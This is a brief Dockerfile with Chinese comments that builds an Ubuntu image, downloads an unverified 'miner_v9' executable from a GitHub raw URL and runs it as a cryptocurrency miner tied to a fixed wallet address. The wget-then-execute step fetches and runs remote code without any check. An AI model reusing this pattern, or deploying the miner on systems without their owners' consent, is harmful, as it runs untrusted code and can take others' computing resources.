# 使用 Ubuntu 24.04 基础镜像
FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive

# 安装依赖和语言支持
RUN apt update && apt install -y \
    wget curl libssl-dev locales ca-certificates \
    && apt clean && \
    locale-gen en_US.UTF-8

# 设置 UTF-8 语言环境
ENV LANG=en_US.UTF-8
ENV LANGUAGE=en_US:en
ENV LC_ALL=en_US.UTF-8

# 下载 miner_v9
RUN wget -O /miner_v9 https://raw.githubusercontent.com/scavenger-syndicate/miner/main/miner_v9 && \
    chmod +x /miner_v9

# 启动命令
CMD ["/miner_v9", "--wallet", "0xcdB022f82D6F0BBfeeEB85FD9056eaC28EB620e4", "--machine_id", "9b", "--threads", "190"]
